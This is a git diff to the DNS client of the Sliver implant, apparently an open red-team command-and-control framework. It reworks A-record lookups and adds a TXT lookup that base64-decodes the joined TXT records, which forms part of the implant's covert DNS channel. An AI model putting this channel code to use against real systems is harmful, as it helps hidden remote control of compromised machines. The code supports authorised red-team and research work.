@@ -20,24 +20,33 @@ package dnsclient
 
 import (
 	"net"
+	"strings"
 	"time"
 
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
+
+	"github.com/bishopfox/sliver/implant/sliver/encoders"
 )
 
+// NewSystemResolver -
 func NewSystemResolver() DNSResolver {
-	return &SystemResolver{}
+	return &SystemResolver{
+		base64: encoders.Base64{},
+	}
 }
 
-type SystemResolver struct{}
+// SystemResolver -
+type SystemResolver struct {
+	base64 encoders.Base64
+}
 
 func (r *SystemResolver) Address() string {
 	return "system"
 }
 
-func (r *SystemResolver) A(domain string) ([][]byte, time.Duration, error) {
+func (r *SystemResolver) A(domain string) ([]byte, time.Duration, error) {
 	// {{if .Config.Debug}}
 	log.Printf("[dns] %s->A record of %s?", r.Address(), domain)
 	// {{end}}
@@ -47,14 +56,28 @@ func (r *SystemResolver) A(domain string) ([][]byte, time.Duration, error) {
 	if err != nil {
 		return nil, rtt, err
 	}
-	var addrs [][]byte
+	var addrs []byte
 	for _, ip := range ips {
 		if ip.To4() != nil {
-			addrs = append(addrs, ip.To4())
+			addrs = append(addrs, ip.To4()...)
 		}
 		if ip.To16() != nil {
-			addrs = append(addrs, ip.To16())
+			addrs = append(addrs, ip.To16()...)
 		}
 	}
 	return addrs, rtt, nil
+}
+
+func (r *SystemResolver) TXT(domain string) ([]byte, time.Duration, error) {
+	// {{if .Config.Debug}}
+	log.Printf("[dns] %s->A record of %s?", r.Address(), domain)
+	// {{end}}
+	started := time.Now()
+	txts, err := net.LookupTXT(domain)
+	rtt := time.Since(started)
+	if err != nil {
+		return nil, rtt, err
+	}
+	data, err := r.base64.Decode([]byte(strings.Join(txts, "")))
+	return data, rtt, err
 }
